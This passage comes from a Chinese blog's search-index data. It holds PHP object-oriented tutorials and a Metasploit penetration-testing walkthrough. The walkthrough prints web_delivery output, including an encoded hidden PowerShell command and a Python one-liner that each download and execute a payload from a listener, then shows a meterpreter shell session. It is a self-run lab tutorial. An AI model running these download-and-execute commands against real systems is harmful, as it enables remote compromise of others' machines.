$arr[&#x27;name&#x27;]?&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $arr[&#x27;sex&#x27;]?&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $arr[&#x27;age&#x27;]?&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $arr[&#x27;edu&#x27;]?&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $arr[&#x27;salary&#x27;]?&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $arr[&#x27;bonus&#x27;]?&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $arr[&#x27;city&#x27;]?&gt;&lt;/td&gt; &lt;td&gt; &lt;a href=&quot;./edit.php&quot;&gt;修改&lt;/a&gt; | &lt;a href=&quot;javascript:void(0)&quot; onClick=&quot;confirmDel(&lt;?php echo $arr[&#x27;id&#x27;]?&gt;)&quot;&gt;删除&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt;","categories":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/categories/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/tags/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}]},{"title":"渗透测试--Metasploit的使用","slug":"渗透测试--Metasploit的使用","date":"2019-12-21T23:34:12.000Z","updated":"2020-11-15T09:21:13.683Z","comments":true,"path":"2019/12/22/渗透测试--Metasploit的使用/","link":"","permalink":"http://s1eady.top/2019/12/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"渗透测试–Metasploit的使用Metasploit的使用目录结构 data modules scripts tools plugins 模块介绍modules目录位置在/usr/share/metasploit-framework/modules/中。 123steady@steady:~$ cd /usr/share/metasploit-framework/modules/steady@steady:/usr/share/metasploit-framework/modules$ lsauxiliary encoders evasion exploits nops payloads post 渗透攻击模块(Exploit)在msf中使用show exploits。 主动渗透攻击：利用模块中的exp对目标发送数据，利用其已知漏洞。 被动渗透攻击：利用木马病毒文件，诱导目标运行文件。 1234567msf5 &gt; show exploit 1543 windows/http/httpdx_handlepeer 2009-10-08 manual Yes HTTPDX h_handlepeer() Function Buffer Overflow 1544 windows/http/httpdx_tolog_format 2009-11-17 manual Yes HTTPDX tolog() Function Format String Vulnerability 1545 windows/http/ia_webmail 2003-11-03 manual No IA WebMail 3.x Buffer Overflow 1546 windows/http/ibm_tivoli_endpoint_bof 2011-05-31 manual No IBM Tivoli Endpoint Manager POST Query Buffer Overflow 1547 windows/http/ibm_tpmfosd_overflow 2007-05-02 manual No IBM TPM for OS Deployment 5.1.0.x rembo.exe Buffer Overflow 1548 windows/http/ibm_tsm_cad_header 2007-09-24 manual No IBM Tivoli Storage Manager Express CAD Service Buffer Overflow 攻击载荷模块(Payload)在msf中使用show payload。 对目标机进行攻击后想让目标机执行的代码，比如反弹shell、bind shell等。 1234567891011msf5 &gt; show payloadsPayloads======== # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 aix/ppc/shell_bind_tcp manual No AIX Command Shell, Bind TCP Inline 1 aix/ppc/shell_find_port manual No AIX Command Shell, Find Port Inline 2 aix/ppc/shell_interact manual No AIX execve Shell for inetd 3 aix/ppc/shell_reverse_tcp manual No AIX Command Shell, Reverse TCP Inline 空指令模块(Nops)不影响程序运行的空指令或无关指令，用于填充。 使用``show nops`查看。 1234567891011121314151617msf5 &gt; show nopsNOP Generators============== # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 aarch64/simple manual No Simple 1 armle/simple manual No Simple 2 mipsbe/better manual No Better 3 php/generic manual No PHP Nop Generator 4 ppc/simple manual No Simple 5 sparc/random manual No SPARC NOP Generator 6 tty/generic manual No TTY Nop Generator 7 x64/simple manual No Simple 8 x86/opty2 manual No Opty2 9 x86/single_byte manual No Single Byte 编码器模块(Encoders)避免”坏字符”的出现，以及免杀处理。 使用show encoders，查看。 后渗透攻击模块(posts)使用show post进行查看。 用以在已经拿到控制权的目标上进行更深层次的渗透。 辅助模块(Auxiliary)使用show auxiliqry查看。 常用命令选择一个指定的模块并使其开始工作 1use[Auxiliary&#x2F;Exploit&#x2F;Payload&#x2F;Encoder] 显示可用的特定功能的模块 1show [auxiliary&#x2F;exploit&#x2F;payload&#x2F;encoder&#x2F;options] 给某个特定的对象赋值 1set [options&#x2F;payload] 12345run 在设定一个辅助模块需要的所有选项之后，启动该模块 exploit 启动一个渗透攻击模块 back 取消当前选择的模块并且退回到上一级命令窗口 info 列出模块的相关信息 search 搜索符合条件的特定模块 msf–web_delivery模块攻击实战操作模块简介在攻击计算机上创建的服务器上托管有效负载。一旦目标机器连接到服务器并且然后执行有效载荷，则运行web传递脚本。 适用情况默写情况下，目标系统没有web环境，我们无法使用webshell获取对方shell，但是我们可以进入对方的系统，或者是对方有命令执行的功能，此时可以使用该模块。常见的是站库分离对数据库服务器的渗透以及网站具有命令执行的功能。 搜索web_delivery模块123456789msf5 &gt; search web_deliveryMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/postgres/postgres_copy_from_program_cmd_exec 2019-03-20 excellent Yes PostgreSQL COPY FROM PROGRAM Command Execution 1 exploit/multi/script/web_delivery 2013-07-19 manual No Script Web Delivery 利用web_delivery模块1234567891011121314151617181920212223242526msf5 exploit(multi/script/web_delivery) &gt; show optionsModule options (exploit/multi/script/web_delivery): Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random)Payload options (python/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Python 设置参数Php 12345msf5 exploit(multi/script/web_delivery) &gt; set payload php/meterpreter/reverse_tcppayload =&gt; php/meterpreter/reverse_tcpmsf5 exploit(multi/script/web_delivery) &gt; set target PHP#命令执行的编程语言。target =&gt; PHPmsf5 exploit(multi/script/web_delivery) &gt; run Python 12345msf5 exploit(multi/script/web_delivery) &gt; set payload python/meterpreter/reverse_tcppayload =&gt; python/meterpreter/reverse_tcpmsf5 exploit(multi/script/web_delivery) &gt; set target Python#命令执行的编程语言。target =&gt; PHPmsf5 exploit(multi/script/web_delivery) &gt; run 在windows下可以设置PowerShell脚本。 12345678910111213141516171819先设置监听payloadmsf5 exploit(multi/script/web_delivery) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf5 exploit(multi/script/web_delivery) &gt; set target PSHtarget =&gt; PSHmsf5 exploit(multi/script/web_delivery) &gt; set LPORT 3333LPORT =&gt; 3333msf5 exploit(multi/script/web_delivery) &gt; set LHOST 0.0.0.0LHOST =&gt; 0.0.0.0msf5 exploit(multi/script/web_delivery) &gt; run[*] Exploit running as background job 3.[*] Exploit completed, but no session was created.[*] Started reverse TCP handler on 172.20.10.4:3333msf5 exploit(multi/script/web_delivery) &gt; [*] Using URL: http://0.0.0.0:8080/DJbXfk9[*] Local IP: http://172.20.10.4:8080/DJbXfk9[*] Server started.[*] Run the following command on the target machine:powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABUAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAFQALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABUAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAyADAALgAxADAALgA0ADoAOAAwADgAMAAvAEQASgBiAFgAZgBrADkALwBRAEIATwBPAGsAQwBqAHYARgBLADYAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMgAwAC4AMQAwAC4ANAA6ADgAMAA4ADAALwBEAEoAYgBYAGYAawA5ACcAKQApADsA 运行123456789[*] Exploit running as background job 0.[*] Exploit completed, but no session was created.[*] Started reverse TCP handler on 172.20.10.4:4444msf5 exploit(multi/script/web_delivery) &gt; [*] Using URL: http://0.0.0.0:8080/fqPktunoW9r1Hl[*] Local IP: http://172.20.10.4:8080/fqPktunoW9r1Hl[*] Server started.[*] Run the following command on the target machine:python -c &quot;import sys;import ssl;u=__import__(&#x27;urllib&#x27;+&#123;2:&#x27;&#x27;,3:&#x27;.request&#x27;&#125;[sys.version_info[0]],fromlist=(&#x27;urlopen&#x27;,));r=u.urlopen(&#x27;http://172.20.10.4:8080/fqPktunoW9r1Hl&#x27;, context=ssl._create_unverified_context());exec(r.read());&quot; 将payload在目标机器运行。 进入目标shell123456789101112131415161718msf5 exploit(multi/script/web_delivery) &gt; sessions -l 2Active sessions=============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 2 meterpreter python/linux steady @ steady 172.20.10.4:4444 -&gt; 172.20.10.10:56678 (172.20.10.10) 3 meterpreter python/linux steady @ steady 172.20.10.4:4444 -&gt; 172.20.10.10:56680 (172.20.10.10)msf5 exploit(multi/script/web_delivery) &gt; sessions -i 2[*] Starting interaction with 2...meterpreter &gt; shellProcess 1241 created.Channel 1 created./bin/sh: 0: can&#x27;t access tty; job control turned off$ iduid=1000(steady) gid=1000(steady) 组=1000(steady),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),133(scanner),1001(wireshark)","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"PHP开发学习--核心编程6","slug":"PHP核心编程5","date":"2019-12-12T23:29:22.000Z","updated":"2020-11-15T09:23:59.527Z","comments":true,"path":"2019/12/13/PHP核心编程5/","link":"","permalink":"http://s1eady.top/2019/12/13/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B5/","excerpt":"","text":"PHP核心编程6静态属性和静态方法static关键字修饰的属性，就是静态属性； static关键字修饰的方法，就是静态方法； 静态属性：就是类的属性，与类相关，与对象无关； 静态方法：就是类的方法，与类相关，与对象无关； 类的东西(类常量、静态属性、静态方法)，通过”\\类名::**“来调用； 静态属性或静态方法，在内存中只有一份，被所有对象去共享； 静态属性或静态方法的好处：就是为了节省内存。例如：创建了100个对象，而静态属性只有一份。 静态属性和类常量的区别：类常量在一次HTTP请求过程值永远不变；但是静态属性可以改变。 静态属性和静态方法，都可以加权限控制符，而类常量没有权限。 1234567891011121314151617181920&lt;?php//定义一个学生类class Student&#123; //私有的保存人数的静态属性：所有对象共享 private static $count = 60; //公共的静态方法 public static function showInfo() &#123; $str = &quot;当前文件名：&quot;.__FILE__; $str .= &quot;&lt;br&gt;当前函数名：&quot;.__FUNCTION__; $str .= &quot;&lt;br&gt;当前方法名：&quot;.__METHOD__; $str .= &quot;&lt;br&gt;班级人数：&quot;.Student::$count; echo $str; &#125;&#125;//在类外访问公共的静态方法//访问类的内容(类常量、静态属性、静态方法),不需要创建对象，直接访问Student::showInfo(); self关键字使用$this是指向当前对象的指针，而self是指向当前类的指针； $this关键字用来调用对象的属性和方法； self用来调用类常量、静态属性、静态方法； $this关键字只能在成员方法中使用； self关键字可以在成员方法和静态方法中使用； 提示：对象可以调用：成员属性、成员方法、静态方法 提示：self可以调用：类常量、静态属性、静态方法、成员方法 1234567891011121314151617181920212223242526&lt;?php//定义一个学生类class Student&#123; //定义类常量 const TITLE = &quot;&lt;h2&gt;第69PHP就业班&lt;/h2&gt;&quot;; //私有的保存人数的静态属性：所有对象共享 private static $count = 60; //公共的静态方法：在静态方法中$this不存在 public static function showInfo() &#123; $str = self::TITLE; $str .= &quot;当前文件名：&quot;.__FILE__; $str .= &quot;&lt;br&gt;当前函数名：&quot;.__FUNCTION__; $str .= &quot;&lt;br&gt;当前方法名：&quot;.__METHOD__; $str .= &quot;&lt;br&gt;班级人数：&quot;.self::$count; echo $str; //var_dump($this); $this不能存在于静态方法 &#125;&#125;//在类外访问公共的静态方法//访问类的内容(类常量、静态属性、静态方法),不需要创建对象，直接访问//对象可以调用：成员属性、成员方法、静态方法$obj = new Student();$obj-&gt;showInfo(); 类的封装性什么是类的封装性类的三大特性：封装性、继承性、多态性； 封装性：将敏感的数据保护起来，不被外界访问；还可以理解为，将一个功能的方方面面，封装成一个整体，即类； 类的封装性，是通过访问权限修饰符来实现的； 提示：在项目中，属性基本都是私有的。通过公有的方法，对私有的属性进行赋值和取值。 访问权限修饰符介绍public(公共的权限)：在任何地方都可以被访问，主要是类内、类外、子类中都可以被访问。 private(私有的权限)：只能在本类中被访问，类外和子类中无权访问。 protected(受保护的权限)：只能在本类中和子类中被访问，在类外不能访问。 实例：数据库的封装类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?php//定义最终的单例的数据库工具类class Db&#123; //私有的静态的保存对象的属性 private static $obj = null; //私有的数据库配置信息 private $db_host; //主机名 private $db_user; //用户名 private $db_pass; //密码 private $db_name; //数据库名 private $charset; //字符集 private $link; //连接对象 //私有的构造方法：阻止类外new对象 private function __construct($config=array()) &#123; $this-&gt;db_host = $config[&#x27;db_host&#x27;]; $this-&gt;db_user = $config[&#x27;db_user&#x27;]; $this-&gt;db_pass = $config[&#x27;db_pass&#x27;]; $this-&gt;db_name = $config[&#x27;db_name&#x27;]; $this-&gt;charset = $config[&#x27;charset&#x27;]; $this-&gt;connectDb(); //连接MySQL服务器 $this-&gt;selectDb(); //选择数据库 $this-&gt;setCharset();//设置字符集 &#125; //私有的克隆方法：阻止类外clone对象 private function __clone()&#123;&#125; //公共的静态的创建对象的方法 public static function getInstance($arr) &#123; //判断当前对象是否存在 if(!self::$obj instanceof self) &#123; //如果对象不存在，创建并保存它 self::$obj = new self($arr); &#125; //返回对象 return self::$obj; &#125; //私有的连接MySQL服务器方法 private function connectDb() &#123; if(!$this-&gt;link = @mysqli_connect($this-&gt;db_host, $this-&gt;db_user, $this-&gt;db_pass)) &#123; echo &quot;连接MySQL服务器失败！&quot;; die(); &#125; &#125; //私有的选择数据库的方法 private function selectDb() &#123; if(!mysqli_select_db($this-&gt;link, $this-&gt;db_name)) &#123; echo &quot;选择数据库&#123;$this-&gt;db_name&#125;失败！&quot;; die(); &#125; &#125; //私有的设置字符集 private function setCharset() &#123; mysqli_set_charset($this-&gt;link, $this-&gt;charset); &#125; //公共的析构方法 public function __destruct() &#123; mysqli_close($this-&gt;link); //断开MySQL连接 &#125;&#125;//创建数据库类的对象$arr = array( &#x27;db_host&#x27; =&gt; &#x27;localhost&#x27;, &#x27;db_user&#x27; =&gt; &#x27;root&#x27;, &#x27;db_pass&#x27; =&gt; &#x27;123456&#x27;, &#x27;db_name&#x27; =&gt; &#x27;phpshujuku&#x27;, &#x27;charset&#x27; =&gt; &#x27;utf8&#x27; );$db1 = Db::getInstance($arr);$db2 = Db::getInstance($arr);var_dump($db1,$db2); 类的继承性什么是类的继承性？CSS样式继承：父标签定义的样式，可以在子标签中直接使用。相同的样式只写一遍，减少代码量。 如果一个B类拥有了A类的所有特征信息，我们就说B类继承了A类。 A类可以称为：基础类(最顶层的类)、父类、上层类。 B类可以称为：最终类(最终的类)、子类、下层类。 提示：如果多个子类拥有相同的属性和方法，可以将相同的属性和方法提取出来，放到“父类”中，然后，再创建子类并继承父类；这样一样，重复的代码只写一遍，减少代码量，提高工作效率。 为什么要使用类的继承？是为了实现功能的升级和扩展。 功能的升级：原来有的功能，在子类进行完善。 功能的扩展：原来没有的功能，在子类增加新功能。 单继承和多继承单继承：只能从一个父类来继承功能。如：Java、PHP、C#等。 多继承：同时从多个父类来继承功能。如：C++。 parent关键字self代表当前类，parent代表父类。 self和parent可以存在于所有方法(成员方法和静态方法)中。 self用来调用本类的内容，包括：类常量、静态属性、静态方法、成员方法； parent用来调用父类的内容，包括：类常量、静态属性、静态方法、成员方法； self和parent都使用范围解析符”::”来调用其它内容。 语法：parent::类常量 | 静态属性 | 静态方法 | 成员方法 1234567891011121314151617181920212223242526&lt;?php//定义一个学生类class Student&#123; const TITLE = &quot;PHP第69期就业班&quot;; protected static $count = 60;&#125;//定义一个传智学生类class ItcastStudent extends Student&#123; const TITLE = &quot;PHP第70期就业班&quot;; protected static $count = 160; public function showInfo() &#123; $str = &quot;父类常量：&quot;.parent::TITLE; $str .= &quot;&lt;br&gt;子类常量：&quot;.self::TITLE; $str .= &quot;&lt;br&gt;父类静态属性：&quot;.parent::$count; $str .= &quot;&lt;br&gt;子类静态属性：&quot;.self::$count; echo $str; &#125;&#125;//创建传智学生类对象$obj = new ItcastStudent();$obj-&gt;showInfo(); 实例：单继承的简单演示1234567891011121314151617181920212223242526272829&lt;?php//定义一个学生类class Student &#123; const TITLE = &quot;&lt;h2&gt;PHP第69期就业班&lt;/h2&gt;&quot;; protected static $count = 60; protected $name = &quot;张三丰&quot;; protected static function readMe()&#123; return __METHOD__; &#125; protected function showInfo()&#123; return __METHOD__; &#125;&#125;//定义一个传智学生类class ItcastStudent extends Student &#123; public function abc() &#123; $str = self::TITLE; $str .= &quot;班级人数：&quot;.ItcastStudent::$count; $str .= &quot;&lt;br&gt;姓名：&#123;$this-&gt;name&#125;&quot;; $str .= &quot;&lt;br&gt;静态方法：&quot;.self::readMe(); $str .= &quot;&lt;br&gt;成员方法：&quot;.$this-&gt;showInfo(); echo $str; &#125;&#125;//创建传智学生类对象$obj = new ItcastStudent();$obj-&gt;abc(); 类的多态什么是类的多态？类的多态，就是类的多种形态。 类的多态主要指方法重载或方法重写。 方法重载：在同一个类中定义两个同名方法，PHP不支持。 方法重写：在子类中定义一个与父类同名的方法，就是“方法重写”。 为什么要重写方法？主要是实现功能的升级。父类中有的方法，子类中再用同样的名字再定义一次，一般来说，子类中方法的功能比父类更完善、更详尽。 方法重写的要求子类中重写的方法，要与父类中的方法同名； 子类中重写的方法形参个数，要与父类中的同名方法形参个数一致； 子类中重写的方法类型，要与父类中同名方法类型一致； 子类中重写的方法的访问权限，不能低于父类中同名方法的访问权限； 父类方法权限为public，子类同名方法权限只能是public； 父类方法权限为protected，子类同名方法权限可以是protected和public； 父类方法权限为private，子类无法继承，也无法重写。 注意：对于重写构造方法，就比较特殊，就没有形参个数的要求。 实例：商品子类重写商品基础类中的方法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;?php//实例：类的三大特性//定义一个基础商品类(最顶层)//基础类是为了继承，不能直接创建对象class Shop&#123; //私有的商品属性 private $name; //商品名称 private $price; //商品价格 //受保护的构造方法 protected function __construct($name2,$price2) &#123; $this-&gt;name = $name2; $this-&gt;price = $price2; &#125; //受保护的显示商品方法 protected function showInfo() &#123; $str = &quot;商品名称：&#123;$this-&gt;name&#125;&quot;; $str .= &quot;&lt;br&gt;商品价格：&#123;$this-&gt;price&#125;&quot;; return $str; &#125;&#125;//创建手机类，并继承商品类class Mobile extends Shop&#123; //私有的手机属性 private $pinpai; //手机品牌 private $city; //手机产地 //重写父类的构造方法 public function __construct($name2,$price2,$pinpai2,$city2) &#123; //调用父类的构造方法 parent::__construct($name2,$price2); $this-&gt;pinpai = $pinpai2; $this-&gt;city = $city2; &#125; //重写父类的showInfo()方法 public function showInfo() &#123; $str = parent::showInfo(); $str .= &quot;&lt;br&gt;手机品牌：&#123;$this-&gt;pinpai&#125;&quot;; $str .= &quot;&lt;br&gt;手机产地：&#123;$this-&gt;city&#125;&quot;; return $str; &#125;&#125;//创建图书类，并继承商品类class Book extends Shop&#123; //私有的图书属性 private $author; //作者 private $publish; //出版社 //重写父类的构造方法 public function __construct($name2,$price2,$author2,$publish2) &#123; //调用父类的构造方法 parent::__construct($name2,$price2); $this-&gt;author = $author2; $this-&gt;publish= $publish2; &#125; //重写父类的showInfo()方法 public function showInfo() &#123; $str = parent::showInfo(); $str .= &quot;&lt;br&gt;作者：&#123;$this-&gt;author&#125;&quot;; $str .= &quot;&lt;br&gt;出版社：&#123;$this-&gt;publish&#125;&quot;; return $str; &#125;&#125;//创建手机类对象$obj1 = new Mobile(&#x27;苹果X&#x27;,8888,&#x27;苹果&#x27;,&#x27;天津市&#x27;);echo $obj1-&gt;showInfo();echo &quot;&lt;hr&gt;&quot;;//创建图书类对象$obj2 = new Book(&#x27;PHP从入门到放弃&#x27;,199.00,&#x27;武大郎&#x27;,&#x27;武大烧饼铺&#x27;);echo $obj2-&gt;showInfo();","categories":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/categories/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/tags/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHP开发学习--核心编程4","slug":"PHP核心编程4","date":"2019-12-11T23:29:22.000Z","updated":"2020-11-15T09:23:38.786Z","comments":true,"path":"2019/12/12/PHP核心编程4/","link":"","permalink":"http://s1eady.top/2019/12/12/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B4/","excerpt":"","text":"PHP核心编程5类的定义类的定义语法格式12345678910&lt;?phpclass Stuent&#123; public $name=&quot;steady&quot;; public $age=24; public function showInfo() &#123; echo __FILE__; &#125;&#125;?&gt; 类的成员属性定义成员属性介绍类的成员属性，就是指某个类具有的公共的特征、特性； 类中定义的变量，就是类的成员属性； 类的成员属性和普通变量的区别：类的成员属性必须要带权限修饰符，而普通变量不需要。 权限修饰符成员属性必须要加权限修改符，否则报错。 public(公共权限)：在任何地方都可以访问，主要包括：类外、本类中、子类中都可以访问。 private(私有权限)：只能在本类中被访问，在类外和子类中都无权访问。 protected(受保护的权限)：只能在本类中和子类中被访问，在类外不能被访问。 举例说明 123456&lt;?phpclass Stuent&#123; public $name=&quot;steady&quot;; private $age=24; protected $steady;?&gt; 类的成员方法定义成员方法介绍类的方法，就是某个类的公共的的行为或动作； 类的成员方法，与普通函数一样，都有返回值和参数； 成员方法与普通函数区别：成员方法只能存在于类中，成员方法定义前可以添加访问权限修饰符； 提示：成员方法可以省略权限修饰符，默认访问权限是public。 举例说明 12345678910&lt;?phpclass Stuent&#123; public function steady()&#123; echo __FILE__; &#125; private function steady()&#123; echo &quot;OK&quot;; &#125;&#125;?&gt; 创建类的实例对象实例化对象的含义定义类是为了生产对象，如果不生产对象，类就没有意义。 一个类可以产生千千万万个对象，对象帮我们干活。 对象实例化：从一个类上来生产对象过程，就是类的实例化。 语法格式 使用new关键字来创建对象。 JS创建对象的方法：var today = new Date() PHP创建对象的方法：$obj = new Student() 对象属性操作如何访问对象的属性和方法？在PHP中，访问对象属性和方法，是通过”\\-&gt;**“来访问的。例如：$obj-&gt;name、$obj-&gt;showInfo() 对象属性的操作对象方法操作对象方法的操作：方法定义、方法调用、传递参数、方法返回值。 1234567891011&lt;?phpini_set(&#x27;display_errors&#x27;,1);class Student&#123; public function echo_info($age,$name) &#123; echo &quot;名字为&#123;$name&#125;,年龄为&#123;$age&#125;。&quot;; &#125;&#125;$student1=new Student;$student1-&gt;echo_info(12,&#x27;steady&#x27;);?&gt; 伪变量$this的使用伪变量$this的含义在PHP中，使用$this变量来代替当前对象，例如：$this-&gt;name = ‘张三’ $this代表当前对象，是到当前对象的一个引用； $this更像是一个对象指针，指向当前对象； $this只能用在对象方法定义中，去调用对象的成员属性或成员方法。 只有创建对象后，$this变量才存在。类不会自动运行。 举例说明1234567891011121314151617181920212223242526&lt;?php//定义一个学生类class Student &#123; //私有的成员属性：类外无法访问 private $name = &quot;张三丰&quot;; private $age = 24; //受保护的成员方法 protected function showLine()&#123; return &quot;&lt;hr&gt;&quot;; &#125; //公共的成员(对象)方法 //$this变量只能在成员方法中使用 public function showInfo() &#123; //在成员方法中，使用$this变量代替传递进来的$obj对象 //$this和$obj指向的是同一个对象 $str = &quot;&lt;h2&gt;&#123;$this-&gt;name&#125;的基本信息&lt;/h2&gt;&quot;; $str .= $this-&gt;showLine(); $str .= &quot;&#123;$this-&gt;name&#125;的年龄是&#123;$this-&gt;age&#125;岁！&quot;; echo $str; &#125;&#125;//创建学生类的对象$obj = new Student;//调用对象的方法$obj-&gt;showInfo(); 类常量的定义类常量介绍可以把在类中始终保持不变的值定义为常量，例如：圆周率、班级名称等。 常量的值必须是一个定值，不能修改，也不能删除； 类常量就是类的常量，是与类相关的，与对象无关。 类常量在内存中只有一份，不管创建多少个对象。 类常量可以极大节省服务器内存，可以被所有对象去共享。 类常量定义和调用格式类常量没有权限，只有属性和方法才会有权限。 使用const来定义类的常量(局部常量)，只能在局部作用域下使用；define()定义常量是全局常量，在任何地方都可以使用。 123456789101112131415161718192021222324252627&lt;?php//定义一个学生类class Student &#123; //声明类常量 const DB_HOST = &quot;localhost&quot;; const DB_USER = &quot;root&quot;; const DB_PASS = &quot;root&quot;; //公共的成员方法 public function showInfo() &#123; $str = &quot;&lt;h2&gt;在类内访问类常量&lt;/h2&gt;&quot;; $str .= &quot;主机名：&quot;.Student::DB_HOST; $str .= &quot;&lt;br&gt;用户名：&quot;.Student::DB_USER; $str .= &quot;&lt;br&gt;密码：&quot;.Student::DB_PASS; echo $str; &#125;&#125;//用静态化方式，直接访问类常量，不需要创建对象$str = &quot;&lt;h2&gt;在类外访问类常量&lt;/h2&gt;&quot;;$str .= &quot;主机名：&quot;.Student::DB_HOST;$str .= &quot;&lt;br&gt;用户名：&quot;.Student::DB_USER;$str .= &quot;&lt;br&gt;密码：&quot;.Student::DB_PASS;echo $str;//创建学生类对象$obj = new Student();$obj-&gt;showInfo(); 构造方法什么是构造方法当使用new关键字创建对象时，第1个自动调用的方法，就是构造方法； 构造方法的名称是固定的：void __construct ([ mixed $args [, $... ]] ) 构造方法可以带参数，也可以不带参数；构造方法不是必须的，是可选的； 构造方法的作用：对象初始化。例如：给对象属性赋值、数据库对象初始化(连接、选择数据库 构造方法一定是成员方法。构造方法的权限可以自己指定。 构造方法一般不需要主动调用，都是自动调用的。 123456789101112131415161718192021222324252627&lt;?php//定义一个学生类class Student &#123; //私有的成员属性：在项目中，成员属性没有具体的数据，可以有默认值 //所有数据都来自外部传递，所有属性一般都是私有的 private $name; private $sex; private $age; //公共的构造方法 public function __construct($name2,$sex2,$age2)&#123; $this-&gt;name = $name2; $this-&gt;sex = $sex2; $this-&gt;age = $age2; &#125; //公共的自我显示的方法 public function showInfo()&#123; $str = &quot;姓名：&#123;$this-&gt;name&#125;&quot;; $str .= &quot;&lt;br&gt;性别：&#123;$this-&gt;sex&#125;&quot;; $str .= &quot;&lt;br&gt;年龄：&#123;$this-&gt;age&#125;&quot;; echo $str; &#125;&#125;//创建学生类的对象$obj = new Student(&quot;张三四&quot;,&quot;男&quot;,26);$obj-&gt;showInfo(); 析构方法什么是析构方法对象销毁前自动调用的方法，就是析构方法； 析构方法的名称是固定的：void __destruct ( void ) 析构方法不带任何参数； 析构方法一定是成员方法。 析构方法的作用：垃圾回收工作，例如：断开到MySQL的连接 对象何时销毁1234567891011&lt;?phpini_set(&#x27;display_errors&#x27;,1);class Student&#123; public function __destruct() &#123; echo &quot;对象即将销毁&quot;; &#125;&#125;$student1=new Student();echo 